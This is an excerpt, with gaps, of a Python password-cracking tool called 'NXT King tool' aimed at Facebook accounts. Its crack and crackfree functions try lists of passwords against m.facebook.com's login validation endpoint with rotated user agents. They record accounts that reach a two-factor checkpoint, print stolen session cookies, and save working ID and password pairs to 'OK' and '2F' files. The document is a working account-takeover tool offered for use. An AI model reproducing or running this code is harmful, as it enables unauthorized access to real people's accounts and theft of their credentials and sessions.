...
print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \x1b[38;5;50m Welcome to NXT King tool ')
os.system("espeak -a 300 \"Welcome to,NXT King tool,\"")
time.sleep(2)
#───────────────[ NXT-END ]─────────────────────────#
#───────────────[ USER AGENT ]─────────────────────────#
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/CYBER-BD71/NXT/blob/main/APROVE.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/skmobarok.rhman')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
#os.system("xdg-open https://m.facebook.com/groups/8224301095261/")
        
logo =""" 

 _   _ _   _ _   _    ___  ___  __________   _____   
| \ | | | | | \ | |  |_  | |  \/  |_   _\ \ / / _ \  
|  \| | | | |  \| |    | | | .  . | | |  \ V / /_\ \ 
| . ` | | | | . ` |    | | | |\/| | | |   \ /|  _  | 
| |\  | |_| | |\  |/\__/ / | |  | |_| |_  | || | | | 
\_| \_/\___/\_| \_/\____/  \_|  |_/\___/  \_/\_| |_/ 
                                                     
                                                     
     
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  NUNU MIYA  
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  NUNU MIYA
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  0.1
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mFILE-/FREE\033[1;32m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m UPDATE CK    :  UPDATE DONE 04/02/2024
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""
os.system('clear')
print(logo)
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[NXT•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;96m[NXT-2F] \x1b[38;5;205m[UID= {idf} [PASS= {pw}')
                os.system('espeak -a 300 " TWO FACTOR,"')
                open('2F/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                print(f'\r\x1b[1;96m[NXT-OK] {idf} • {pw}\n\033[0;93m[🍁] COOKIES • \x1b[1;91m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[NXT-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•NXT-Cp] {idf} • {pw}')
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[NXT-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Ok,  NXT,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
